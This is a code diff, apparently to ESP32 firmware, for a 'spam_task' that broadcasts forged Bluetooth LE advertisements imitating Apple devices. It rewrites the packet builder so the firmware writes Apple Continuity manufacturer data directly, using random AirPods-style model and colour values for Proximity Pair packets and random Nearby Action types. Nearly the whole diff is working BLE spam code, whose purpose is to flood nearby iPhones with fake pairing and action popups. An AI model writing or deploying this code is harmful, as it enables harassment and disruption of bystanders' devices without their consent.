@@ -317,9 +317,10 @@ static void spam_task(void *arg) {
                 mfg_len = sizeof(IOS2) + 2;
                 ESP_LOGD(TAG_BLE, "Sending legacy iOS payload 2");
             } else {
-                // Use advanced Apple Continuity protocol
-                uint8_t adv_data[31];
-                size_t adv_len = 0;
+                // Use advanced Apple Continuity protocol - simplified approach
+                // Generate a basic Apple manufacturer data packet with Continuity-style data
+                mfg_buf[0] = 0x4C;  // Apple Company ID (little endian)
+                mfg_buf[1] = 0x00;
                 
                 // Randomly choose between Proximity Pair and Nearby Action
                 if (esp_random() % 2 == 0) {
@@ -328,64 +329,36 @@ static void spam_task(void *arg) {
                     const apple_device_t* device = &apple_devices[device_idx];
                     uint8_t color = device->colors[esp_random() % device->color_count];
                     
-                    generate_proximity_pair_packet(adv_data, &adv_len, device->model, color);
-                    ESP_LOGD(TAG_BLE, "Sending Proximity Pair for %s (model: 0x%04X, color: 0x%02X)", 
+                    // Build simplified Proximity Pair manufacturer data
+                    mfg_buf[2] = 0x07;  // Proximity Pair type
+                    mfg_buf[3] = 0x19;  // Length
+                    mfg_buf[4] = 0x01;  // Flags
+                    mfg_buf[5] = (device->model >> 8) & 0xFF;  // Model high byte
+                    mfg_buf[6] = device->model & 0xFF;         // Model low byte
+                    mfg_buf[7] = 0x01;  // Status
+                    mfg_buf[8] = color; // Color
+                    // Add some random data
+                    for (int i = 9; i < 21; i++) {
+                        mfg_buf[i] = esp_random() & 0xFF;
+                    }
+                    mfg_len = 21;
+                    ESP_LOGD(TAG_BLE, "Sending simplified Proximity Pair for %s (model: 0x%04X, color: 0x%02X)", 
                             device->name, device->model, color);
                 } else {
                     // Nearby Action - random action type
                     uint32_t action_idx = esp_random() % NEARBY_ACTIONS_COUNT;
                     uint8_t action_type = nearby_actions[action_idx].action;
                     
-                    generate_nearby_action_packet(adv_data, &adv_len, action_type);
-                    ESP_LOGD(TAG_BLE, "Sending Nearby Action: %s (0x%02X)", 
+                    // Build simplified Nearby Action manufacturer data
+                    mfg_buf[2] = 0x0F;  // Nearby Action type
+                    mfg_buf[3] = 0x05;  // Length
+                    mfg_buf[4] = action_type;
+                    mfg_buf[5] = esp_random() & 0xFF;
+                    mfg_buf[6] = esp_random() & 0xFF;
+                    mfg_buf[7] = esp_random() & 0xFF;
+                    mfg_len = 8;
+                    ESP_LOGD(TAG_BLE, "Sending simplified Nearby Action: %s (0x%02X)", 
                             nearby_actions[action_idx].name, action_type);
-                }
-                
-                // Convert Apple Continuity packet to manufacturer data format to avoid memory leaks
-                // Extract the Continuity service data and format as Apple manufacturer data
-                if (adv_len >= 9) {  // Minimum: 3 bytes flags + 6 bytes service data header
-                    // Find the service data portion (skip flags)
-                    uint8_t* service_data_start = NULL;
-                    size_t remaining = adv_len - 3;  // Skip flags
-                    uint8_t* ptr = &adv_data[3];
-                    
-                    while (remaining > 0) {
-                        uint8_t len = ptr[0];
-                        uint8_t type = ptr[1];
-                        
-                        if (type == 0x16 && len >= 4) {  // Service Data with 16-bit UUID
-                            // Check if it's Apple Continuity service (0xFED2)
-                            if (ptr[2] == 0xD2 && ptr[3] == 0xFE) {
-                                service_data_start = &ptr[4];  // Skip length, type, and UUID
-                                break;
-                            }
-                        }
-                        
-                        ptr += len + 1;
-                        remaining -= len + 1;
-                    }
-                    
-                    if (service_data_start && (service_data_start - adv_data) < adv_len) {
-                        // Format as Apple manufacturer data: Company ID (0x004C) + Continuity data
-                        mfg_buf[0] = 0x4C;  // Apple Company ID (little endian)
-                        mfg_buf[1] = 0x00;
-                        
-                        size_t continuity_data_len = adv_len - (service_data_start - adv_data);
-                        if (continuity_data_len <= sizeof(mfg_buf) - 2) {
-                            memcpy(&mfg_buf[2], service_data_start, continuity_data_len);
-                            mfg_len = continuity_data_len + 2;
-                        } else {
-                            ESP_LOGW(TAG_BLE, "Apple Continuity data too large, truncating");
-                            memcpy(&mfg_buf[2], service_data_start, sizeof(mfg_buf) - 2);
-                            mfg_len = sizeof(mfg_buf);
-                        }
-                    } else {
-                        ESP_LOGE(TAG_BLE, "Could not find Apple Continuity service data");
-                        continue;
-                    }
-                } else {
-                    ESP_LOGE(TAG_BLE, "Invalid Apple Continuity packet size: %zu", adv_len);
-                    continue;
                 }
             }
         } else if (current_spam_type == BLE_SPAM_SAMSUNG) {
